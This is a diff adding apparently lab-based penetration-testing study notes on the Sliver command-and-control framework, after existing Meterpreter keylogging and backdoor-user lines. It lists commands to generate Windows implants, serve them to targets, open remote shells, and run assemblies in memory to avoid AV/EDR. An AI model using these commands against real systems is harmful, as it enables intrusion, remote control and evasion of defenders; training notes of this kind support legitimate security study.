@@ -215,8 +215,6 @@ keyscan_dump
 
 keyscan_stop
 
-
-
 =======================================================
 
 Meterpreter
@@ -289,3 +287,104 @@ net localgroup administrators
 
 net user BACKDOOR /del
 
+======================================================================================================================================================================================
+
+Sliver
+------
+
+Sliver-server
+-------------
+
+- start sliver-server
+  sliver-server
+
+
+Sliver-client
+-------------
+
+- import client config to sliver-client:
+  sliver-client import /tmp/zerocool_192.168.245.128.cfg 
+  
+- start sliver-client
+  sliver-client
+
+
+On sliver-server shell:
+
+- enable multiplayer mode
+[server] sliver > multiplayer
+  
+- create a new user (users are called "operators" on Sliver):
+[server] sliver > new-operator -n zerocool -s /tmp/ -l 192.168.245.128
+
+  -> here username is zerocool
+  -> ip address given is the local ip address, but I suppose for cases where the sliver server is hosted on a different server, we'll have to give the public ip from where we'll connect? (need to validate this)
+  
+  Note: The config file generated (in /tmp/*.cfg) would be owned by root - because we ran sliver-server using sudo. So change the ownership to your userrname using the command:
+  sudo chown sec560:sec560 /tmp/*.cfg
+
+
+On sliver-client shell:
+
+- start https listener
+  https
+
+- generate payload
+  generate --os windows --skip-symbols --name first --http <ip-address-of-server>
+  
+  --skip-symbols: bypass encryption used to generate payload (to speed up generation of payload, ideally always use this)
+  --http: I think the arg value can also be a domain (validate this)
+
+- guardrails that we can use to attempt to limit where the payload gets executed
+    -w, --limit-datetime: limit execution to before datetime (similar to KillDate in Empire)
+    -x, --limit-domainjoined: limit execution to domain joined machines
+    -F, --limit-fileexists: limit execution to hosts with this file in the filesystem
+    -z, --limit-hostname: limit execution to specified hostname
+    -y, --limit-username: limit execution to specified username
+
+- serve the payload generated to the target:
+  sudo chmod o+r payload.exe
+  python3 -m http.server
+  
+  -> we need to add the permissions because the file generated would also be having only read permissions to root (since we ran it using sudo), so add permissions to "others" so python can access it probably.
+ 
+- view active sessions
+  sessions
+  
+- switch to use a session
+  use <full-session-id-or-partial-session-id-as-long-as-it-is-unique>
+  
+- Shows the SID of the user and group
+   getuid
+   getgid
+   
+- show username
+  whoami
+  
+- the superset of all the above commands, plus gives OS version, build num etc (the most useful):
+  info
+  
+- start a new shell (like powershell/cmd) on the target:
+  shell
+  
+  -> When you run shell you get a notification that this is bad OPSEC. Defensive tools are tuned to look for processes spawning tools commonly used by malicious actors, such as CMD and PowerShell.
+  -> To exit out of this shell, just enter exit.
+  -> Although, sometimes the exit command doesn't finish in a timely fashion on this latest Windows 11 revision. If you don't see the sliver prompt return after a few seconds, press Ctrl+C to exit sliver, then restart it by re-running sliver-client. Then, interact with the session again using use and the first few characters of the session ID.
+  -> On the bright side, since we're not closing down the server, we don't lose the session even if we have to restart the Sliver client.
+
+
+Sliver execute-assembly
+-----------------------
+
+Sliver doesn't have a lot of post-exploitation tools like Metasploit, instead it allows executing assemblies:
+
+> An assembly is a collection of types and resources that are built to work together and form a logical unit of functionality. Assemblies take the form of executable (.exe) or dynamic link library (.dll) files, and are the building blocks of .NET applications. They provide the common language runtime with the information it needs to be aware of type implementations.
+
+- Basically assembly is a ready-to-use executables available on github.
+- Sliver will transfer the file and execute it in-memory, so there's no trace of it for AV/EDR systems.
+
+
+- Execute SharpWMI to see who's logged on
+  execute-assembly /home/sec560/labs/SharpWMI.exe action=loggedon
+
+  -> Don't specify the action arg and it will show a list of all supported actions.
